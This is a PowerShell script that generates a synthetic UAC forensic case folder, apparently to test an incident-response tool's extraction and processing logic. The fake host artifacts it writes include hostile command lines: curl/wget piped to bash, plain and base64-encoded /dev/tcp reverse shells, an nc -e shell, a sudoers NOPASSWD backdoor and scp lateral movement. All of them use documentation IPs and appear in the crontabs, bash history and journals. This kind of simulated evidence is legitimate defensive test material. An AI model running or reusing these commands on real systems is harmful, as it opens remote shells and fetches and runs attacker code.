<#
.SYNOPSIS
    Builds a synthetic UAC case folder for testing the two per-collection checks:
      1. already extracted from Upload\ into Decompressed\
      2. already processed and saved to Processed\ (.processed marker)

.DESCRIPTION
    Every collection gets a small UAC-like tree (auth.log, syslog, journal, hostname,
    timedatectl, ps, bodyfile, bash_history) and a .tar.gz in Upload\.
    The case is pre-seeded so each collection exercises one scenario:

      uac-web01-linux-20261101   Archive only                      -> extract + process
      uac-db01-linux-20261102    Already extracted                 -> "Already extracted", process
      uac-app01-linux-20261103   Empty folder + stale _partial_    -> re-extract, process
      uac-mail01-linux-20261104  Extracted + Processed with marker -> skipped (scan label + log)
      uac-file01-linux-20261105  Extracted + Processed, no marker  -> output cleared + reprocessed
      uac-broken-linux-20261106  Corrupt archive                   -> error, no folder left behind

    Each collection also has two binary systemd journals (active + archived)
    under [root]\var\log\journal\<machine-id>\ for the journal parser.

    All IPs are from documentation ranges (RFC 5737).

.PARAMETER Path
    Case folder to create. Default: TestCase\ in the repo root (git-ignored).

.PARAMETER Force
    Delete an existing case folder at Path first.

.EXAMPLE
    .\tools\New-TestCase.ps1 -Force
#>
param(
    [string]$Path = (Join-Path (Split-Path $PSScriptRoot -Parent) 'TestCase'),
    [switch]$Force
)

$ErrorActionPreference = 'Stop'
$tar = Join-Path $env:SystemRoot 'System32\tar.exe'
if (-not (Test-Path $tar)) { throw "tar.exe not found at $tar" }

if (Test-Path $Path) {
    if (-not $Force) { throw "$Path already exists. Use -Force to recreate it." }
    Remove-Item $Path -Recurse -Force
}

$upload     = Join-Path $Path 'Upload'
$decomp     = Join-Path $Path 'Decompressed'
$processed  = Join-Path $Path 'Processed'
$staging    = Join-Path $env:TEMP ('csirt_testcase_' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Force $upload, $staging | Out-Null

$utf8 = New-Object System.Text.UTF8Encoding($false)
function Write-LfFile([string]$file, [string[]]$lines) {
    [void][IO.Directory]::CreateDirectory([IO.Path]::GetDirectoryName($file))
    [IO.File]::WriteAllText($file, (($lines -join "`n") + "`n"), $utf8)
}

# Minimal binary systemd journal (regular, uncompressed) with just the
# structure JournalFileParser reads: header magic/flags/entry_array_offset,
# DATA objects ("FIELD=value"), ENTRY objects and one ENTRY_ARRAY.
# Hash tables are omitted, so journalctl itself will not read these files.
function Write-Journal([string]$file, [object[]]$entries) {
    $ms = New-Object IO.MemoryStream
    $bw = New-Object IO.BinaryWriter($ms)
    $pad = { param($n) $bw.Write((New-Object byte[] $n)) }
    $align = { while ($ms.Position % 8) { $bw.Write([byte]0) } }
    $objHeader = { param([byte]$type, [long]$size) $bw.Write($type); $bw.Write([byte]0); & $pad 6; $bw.Write([uint64]$size) }

    $bw.Write([byte[]](0x4C,0x50,0x4B,0x53,0x48,0x48,0x52,0x48))   # "LPKSHHRH"
    & $pad 248                                                       # rest of 256-byte header

    $entryOffsets = New-Object 'System.Collections.Generic.List[long]'
    $seq = 0
    foreach ($e in $entries) {
        $dataOffsets = @()
        foreach ($k in $e.F.Keys) {
            & $align
            $dataOffsets += $ms.Position
            $payload = $utf8.GetBytes("$k=$($e.F[$k])")
            & $objHeader 1 (64 + $payload.Length)                     # DATA
            & $pad 40; $bw.Write([uint64]1)                           # hash..entry_array_offset, n_entries
            $bw.Write($payload)
        }
        & $align
        $entryOffsets.Add($ms.Position)
        $seq++
        & $objHeader 3 (64 + 16 * $dataOffsets.Count)                 # ENTRY
        $bw.Write([uint64]$seq)
        $bw.Write([uint64]($e.T.ToUnixTimeMilliseconds() * 1000))     # realtime (usec)
        $bw.Write([uint64]($seq * 1000000))                           # monotonic
        & $pad 16; $bw.Write([uint64]0)                               # boot_id, xor_hash
        foreach ($o in $dataOffsets) { $bw.Write([uint64]$o); $bw.Write([uint64]0) }
    }
    & $align
    $arrayOffset = $ms.Position
    & $objHeader 6 (24 + 8 * $entryOffsets.Count)                     # ENTRY_ARRAY
    $bw.Write([uint64]0)                                              # next_entry_array_offset
    foreach ($o in $entryOffsets) { $bw.Write([uint64]$o) }

    $len = $ms.Length
    $ms.Position = 88;  $bw.Write([uint64]256)                        # header_size
    $ms.Position = 96;  $bw.Write([uint64]($len - 256))               # arena_size
    $ms.Position = 152; $bw.Write([uint64]$entryOffsets.Count)        # n_entries
    $ms.Position = 176; $bw.Write([uint64]$arrayOffset)               # entry_array_offset
    $bw.Flush()
    [void][IO.Directory]::CreateDirectory([IO.Path]::GetDirectoryName($file))
    [IO.File]::WriteAllBytes($file, $ms.ToArray())
}

function New-JournalEntry([datetimeoffset]$t, [string]$host_, [string]$ident, [int]$pid_, [int]$uid, [int]$prio, [string]$msg, [hashtable]$extra = @{}) {
    $f = [ordered]@{
        _HOSTNAME = $host_; _TRANSPORT = 'syslog'; SYSLOG_IDENTIFIER = $ident
        _PID = "$pid_"; _UID = "$uid"; PRIORITY = "$prio"; _COMM = $ident; MESSAGE = $msg
    }
    foreach ($k in $extra.Keys) { $f[$k] = $extra[$k] }
    @{ T = $t; F = $f }
}

function New-Collection([string]$name, [string]$host_, [string]$day) {
    $root = Join-Path $staging $name
    $sys  = Join-Path $root '[root]'
    $lr   = Join-Path $root 'live_response'
    $epoch = [long]([datetimeoffset]::new([int]2026, 11, [int]$day, 12, 0, 0, [timespan]::Zero).ToUnixTimeSeconds())
    $d = [int]$day
    # Host IP 192.0.2.(20+day); each host also copies the dropper to the next
    # host (01->02 ... 05->01) so the case summary can show lateral movement.
    $myIp   = "192.0.2.$(20 + $d)"
    $nextIp = "192.0.2.$(21 + ($d % 5))"

    Write-LfFile "$sys\etc\hostname" @($host_)

    Write-LfFile "$sys\var\log\auth.log" @(
        ("Nov {0,2} 09:58:01 {1} sshd[1201]: Accepted publickey for deploy from 198.51.100.10 port 50122 ssh2: ED25519 SHA256:abc" -f $d, $host_)
        ("Nov {0,2} 09:58:01 {1} sshd[1201]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)" -f $d, $host_)
        ("Nov {0,2} 10:15:22 {1} sshd[1310]: Failed password for root from 203.0.113.45 port 51122 ssh2" -f $d, $host_)
        ("Nov {0,2} 10:15:25 {1} sshd[1310]: Failed password for root from 203.0.113.45 port 51122 ssh2" -f $d, $host_)
        ("Nov {0,2} 10:15:29 {1} sshd[1310]: Failed password for root from 203.0.113.45 port 51122 ssh2" -f $d, $host_)
        ("Nov {0,2} 10:16:02 {1} sshd[1322]: Invalid user admin from 203.0.113.45 port 51190" -f $d, $host_)
        ("Nov {0,2} 10:16:04 {1} sshd[1322]: Failed password for invalid user admin from 203.0.113.45 port 51190 ssh2" -f $d, $host_)
        ("Nov {0,2} 10:21:40 {1} sshd[1400]: Accepted password for root from 203.0.113.45 port 51344 ssh2" -f $d, $host_)
        ("Nov {0,2} 10:21:40 {1} sshd[1400]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)" -f $d, $host_)
        ("Nov {0,2} 10:22:11 {1} sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash support" -f $d, $host_)
        ("Nov {0,2} 10:22:11 {1} useradd[1455]: new user: name=support, UID=1002, GID=1002, home=/home/support, shell=/bin/bash" -f $d, $host_)
        ("Nov {0,2} 10:40:03 {1} sshd[1400]: pam_unix(sshd:session): session closed for user root" -f $d, $host_)
        ("Nov {0,2} 11:02:17 {1} sshd[1201]: pam_unix(sshd:session): session closed for user deploy" -f $d, $host_)
    )

    Write-LfFile "$sys\var\log\syslog" @(
        ("Nov {0,2} 09:00:00 {1} systemd[1]: Started Daily apt download activities." -f $d, $host_)
        ("Nov {0,2} 10:23:05 {1} CRON[1490]: (root) CMD (curl -s http://203.0.113.45/x.sh | bash)" -f $d, $host_)
        ("Nov {0,2} 10:25:44 {1} kernel: [ 1234.5678] TCP: request_sock_TCP: Possible SYN flooding on port 22. Sending cookies." -f $d, $host_)
        ("Nov {0,2} 11:00:00 {1} systemd[1]: Starting Cleanup of Temporary Directories..." -f $d, $host_)
    )

    Write-LfFile "$sys\root\.bash_history" @(
        'id'
        'uname -a'
        'cd /tmp'
        'wget http://203.0.113.45/x.sh -O /tmp/.x.sh'
        'chmod +x /tmp/.x.sh'
        '/tmp/.x.sh'
        'useradd -m -s /bin/bash support'
        'echo "support ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
        "scp /tmp/.x.sh root@${nextIp}:/tmp/.x.sh"
        'history -c'
    )

    # ── Crontab definitions: benign (Info), Suspicious (MEDIUM), Critical (HIGH) ──
    Write-LfFile "$sys\etc\crontab" @(
        '# /etc/crontab: system-wide crontab'
        'SHELL=/bin/sh'
        'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin'
        ''
        '# m h dom mon dow user  command'
        '17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly'
        '25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }'
        '47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }'
        '*/5 *   * * *   root    /tmp/.x.sh --pool 203.0.113.45:3333 >/dev/null 2>&1'
    )
    Write-LfFile "$sys\etc\cron.d\e2scrub_all" @(
        '30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron'
    )
    Write-LfFile "$sys\etc\cron.d\sysupdate" @(
        '# looks like a system job, is not'
        "@reboot root /bin/bash -c 'bash -i >& /dev/tcp/203.0.113.45/4444 0>&1'"
        '0 */6 * * * root wget -q -O- http://203.0.113.45/update.sh | sh'
    )
    Write-LfFile "$sys\etc\cron.d\backup" @(
        'MAILTO=ops@example.com'
        '30 2 * * * backup rsync -a /srv/data/ backup@198.51.100.20:/backups/' + $host_ + '/'
    )
    Write-LfFile "$sys\etc\cron.daily\logrotate" @(
        '#!/bin/sh'
        '# skip in favour of systemd timer'
        'if [ -d /run/systemd/system ]; then'
        '    exit 0'
        'fi'
        '/usr/sbin/logrotate /etc/logrotate.conf'
    )
    Write-LfFile "$sys\var\spool\cron\crontabs\root" @(
        '# DO NOT EDIT THIS FILE - edit the master and reinstall.'
        '@reboot /dev/shm/.kworker -d'
        '0 * * * * echo YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuNDUvNDQ0NCAwPiYx | base64 -d | bash'
        '15 4 * * * /usr/bin/find /var/tmp -mtime +7 -delete'
    )
    Write-LfFile "$sys\var\spool\cron\crontabs\deploy" @(
        '# DO NOT EDIT THIS FILE - edit the master and reinstall.'
        '0 3 * * * /home/deploy/bin/rotate-releases.sh'
        '*/15 * * * * curl -s https://198.51.100.10/healthcheck > /dev/null'
    )
    Write-LfFile "$sys\var\spool\cron\crontabs\support" @(
        '*/10 * * * * nc 203.0.113.45 4444 -e /bin/sh'
    )

    Write-LfFile "$lr\system\hostname.txt" @($host_)
    Write-LfFile "$lr\network\ip_addr_show.txt" @(
        '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000'
        '    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00'
        '    inet 127.0.0.1/8 scope host lo'
        '       valid_lft forever preferred_lft forever'
        '    inet6 ::1/128 scope host'
        '       valid_lft forever preferred_lft forever'
        '2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000'
        ('    link/ether 52:54:00:12:34:{0:x2} brd ff:ff:ff:ff:ff:ff' -f $d)
        ('    inet {0}/24 brd 192.0.2.255 scope global eth0' -f $myIp)
        '       valid_lft forever preferred_lft forever'
        ('    inet6 fe80::5054:ff:fe12:34{0:x2}/64 scope link' -f $d)
        '       valid_lft forever preferred_lft forever'
    )
    Write-LfFile "$lr\system\timedatectl_status.txt" @(
        ("               Local time: Sun 2026-11-{0} 13:00:00 CET" -f $day)
        ("           Universal time: Sun 2026-11-{0} 12:00:00 UTC" -f $day)
        ("                 RTC time: Sun 2026-11-{0} 12:00:00" -f $day)
        "                Time zone: Europe/Stockholm (CET, +0100)"
        "System clock synchronized: yes"
        "              NTP service: active"
        "          RTC in local TZ: no"
    )
    Write-LfFile "$lr\system\date.txt" @(("Sun Nov  {0} 13:00:00 CET 2026" -f $d))
    Write-LfFile "$lr\process\ps.txt" @(
        'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND'
        'root           1  0.0  0.1 167740 11524 ?        Ss   09:00   0:01 /sbin/init'
        'root         812  0.0  0.0  15420  9012 ?        Ss   09:00   0:00 sshd: /usr/sbin/sshd -D'
        'root        1502 12.4  1.2 512340 98000 ?        Sl   10:23   5:12 /tmp/.x.sh --pool 203.0.113.45:3333'
        'root        1530  0.0  0.0   8900  3300 ?        S    10:24   0:00 /bin/bash -i'
    )
    Write-LfFile "$lr\network\netstat_-anp.txt" @(
        'Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name'
        'tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      812/sshd'
        ("tcp        0      0 {0}:44012        203.0.113.45:3333       ESTABLISHED 1502/.x.sh" -f $myIp)
        ("tcp        0      0 {0}:22           203.0.113.45:51344      ESTABLISHED 1400/sshd: root" -f $myIp)
    )

    # ── systemd journal (UTC; host is CET, so 10:21 local = 09:21 UTC) ──
    $u = { param($dayOffset, $h, $m, $s) [datetimeoffset]::new(2026, 11, $d, $h, $m, $s, [timespan]::Zero).AddDays($dayOffset) }
    $machineId = ([guid]::NewGuid().ToString('N'))
    $jdir = "$sys\var\log\journal\$machineId"

    Write-Journal "$jdir\system.journal" @(
        (New-JournalEntry (& $u 0 8 57 50) $host_ 'systemd' 1 0 6 'Started Session 12 of User deploy.' @{ _TRANSPORT = 'journal' })
        (New-JournalEntry (& $u 0 9 15 22) $host_ 'sshd' 1310 0 6 'Failed password for root from 203.0.113.45 port 51122 ssh2')
        (New-JournalEntry (& $u 0 9 15 29) $host_ 'sshd' 1310 0 6 'Failed password for root from 203.0.113.45 port 51122 ssh2')
        (New-JournalEntry (& $u 0 9 21 40) $host_ 'sshd' 1400 0 6 'Accepted password for root from 203.0.113.45 port 51344 ssh2')
        (New-JournalEntry (& $u 0 9 22 5)  $host_ 'sudo' 1450 0 5 '    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/tmp/.x.sh --install' @{ _EXE = '/usr/bin/sudo'; _CMDLINE = 'sudo /tmp/.x.sh --install' })
        (New-JournalEntry (& $u 0 9 23 5)  $host_ 'CRON' 1490 0 6 '(root) CMD (wget -q -O /tmp/.x.sh http://203.0.113.45/x.sh)' @{ _EXE = '/usr/bin/dash'; _CMDLINE = '/bin/sh -c wget -q -O /tmp/.x.sh http://203.0.113.45/x.sh' })
        (New-JournalEntry (& $u 0 9 23 6)  $host_ '.x.sh' 1502 0 6 'worker started, pool 203.0.113.45:3333' @{ _EXE = '/tmp/.x.sh'; _CMDLINE = '/tmp/.x.sh --pool 203.0.113.45:3333' })
        (New-JournalEntry (& $u 0 9 24 0)  $host_ 'bash' 1530 0 6 'bash -i >& /dev/tcp/203.0.113.45/4444 0>&1' @{ _EXE = '/usr/bin/bash'; _CMDLINE = 'bash -i' })
        (New-JournalEntry (& $u 0 9 30 0)  $host_ 'kernel' 0 0 4 'Out of memory: Killed process 1502 (.x.sh) total-vm:512340kB' @{ _TRANSPORT = 'kernel' })
        (New-JournalEntry (& $u 0 10 0 0)  $host_ 'systemd' 1 0 6 'Starting Cleanup of Temporary Directories...' @{ _TRANSPORT = 'journal' })
    )
    # Archived (rotated) journal from the day before
    Write-Journal ("$jdir\system@{0}-0000000000000001-0006{1:x10}.journal" -f $machineId, $epoch) @(
        (New-JournalEntry (& $u -1 7 0 0)   $host_ 'systemd' 1 0 6 'Reached target Multi-User System.' @{ _TRANSPORT = 'journal' })
        (New-JournalEntry (& $u -1 8 58 1)  $host_ 'sshd' 1201 0 6 'Accepted publickey for deploy from 198.51.100.10 port 50122 ssh2')
        (New-JournalEntry (& $u -1 16 2 17) $host_ 'sshd' 1201 0 6 'pam_unix(sshd:session): session closed for user deploy')
    )

    # epoch = 12:00 UTC. .x.sh written by wget at 09:23:05 UTC, account/sudoers changed at 09:22:11 UTC
    $t1 = $epoch - 9415; $t2 = $epoch - 9469
    Write-LfFile "$root\bodyfile\bodyfile.txt" @(
        "0|/etc/passwd|1310721|-rw-r--r--|0|0|2450|$epoch|$t2|$t2|0"
        "0|/etc/sudoers|1310801|-r--r-----|0|0|1830|$epoch|$t2|$t2|0"
        "0|/tmp/.x.sh|393220|-rwxr-xr-x|0|0|8812|$epoch|$t1|$t1|0"
        "0|/home/support|1572866|drwxr-x---|1002|1002|4096|$epoch|$t2|$t2|0"
        "0|/usr/bin/ls|2097155|-rwxr-xr-x|0|0|138208|$epoch|1700000000|1700000000|0"
    )

    Write-LfFile "$root\uac.log" @(("2026-11-{0} 12:00:00 Z INFO UAC (Unix-like Artifacts Collector) synthetic test collection for {1}" -f $day, $host_))

    # Archive the tree without a wrapper folder, like UAC does.
    $entries = [IO.Directory]::GetFileSystemEntries($root) | ForEach-Object { [IO.Path]::GetFileName($_) }
    & $tar -czf (Join-Path $upload "$name.tar.gz") -C $root @entries
    if ($LASTEXITCODE -ne 0) { throw "tar failed for $name" }
    return $root
}

function Copy-Extracted([string]$src, [string]$name) {
    $dst = Join-Path $decomp $name
    & robocopy $src $dst /E /NFL /NDL /NJH /NJS /NP | Out-Null
    if ($LASTEXITCODE -ge 8) { throw "robocopy failed for $name" }
    $global:LASTEXITCODE = 0
}

$cols = [ordered]@{
    'uac-web01-linux-20261101'  = @('web01',  '01')
    'uac-db01-linux-20261102'   = @('db01',   '02')
    'uac-app01-linux-20261103'  = @('app01',  '03')
    'uac-mail01-linux-20261104' = @('mail01', '04')
    'uac-file01-linux-20261105' = @('file01', '05')
}
$src = @{}
foreach ($k in $cols.Keys) { $src[$k] = New-Collection $k $cols[$k][0] $cols[$k][1] }

New-Item -ItemType Directory -Force $decomp | Out-Null

# db01: already extracted -> "Already extracted"
Copy-Extracted $src['uac-db01-linux-20261102'] 'uac-db01-linux-20261102'

# app01: simulated crash -> empty final folder + stale partial folder
New-Item -ItemType Directory -Force (Join-Path $decomp 'uac-app01-linux-20261103') | Out-Null
$stale = Join-Path $decomp '_partial_uac-app01-linux-20261103\[root]\var\log'
Write-LfFile (Join-Path $stale 'auth.log') @('TRUNCATED - stale partial extraction, must be deleted')

# mail01: extracted + fully processed (marker) -> skipped
Copy-Extracted $src['uac-mail01-linux-20261104'] 'uac-mail01-linux-20261104'
$mailOut = Join-Path $processed 'uac-mail01-linux-20261104'
Write-LfFile (Join-Path $mailOut 'QuickWins.txt') @('Pre-existing output from an earlier complete run - must be left untouched.')
Write-LfFile (Join-Path $mailOut '.processed') @('Processed 2026-11-10 08:00:00Z')

# file01: extracted + interrupted run (no marker) -> cleared and reprocessed
Copy-Extracted $src['uac-file01-linux-20261105'] 'uac-file01-linux-20261105'
$fileOut = Join-Path $processed 'uac-file01-linux-20261105'
Write-LfFile (Join-Path $fileOut 'Normalized_AUTH_LOG.csv') @('STALE-ROW-FROM-INTERRUPTED-RUN - must not survive reprocessing')

# broken: corrupt archive -> extraction error, no folder left behind
[IO.File]::WriteAllBytes((Join-Path $upload 'uac-broken-linux-20261106.tar.gz'), [byte[]]((0x1f,0x8b,0x08,0x00) + (1..200)))

[IO.Directory]::Delete($staging, $true)

Write-Host "Test case created: $Path"
Write-Host ''
Write-Host 'Expected on Scan:'
Write-Host '  web01   extracted now'
Write-Host '  db01    "Already extracted"'
Write-Host '  app01   re-extracted (empty folder), _partial_ folder gone'
Write-Host '  mail01  listed "(already processed - will be skipped)"'
Write-Host '  file01  listed normally'
Write-Host '  broken  [ERROR] in list, no Decompressed\uac-broken* or _partial_ folder'
Write-Host 'Expected on Run:'
Write-Host '  mail01  "Skipping ... already processed", QuickWins.txt unchanged'
Write-Host '  file01  "[WARN] Incomplete output ... clearing", STALE-ROW gone'
Write-Host '  all others get .processed; a second Run skips everything'
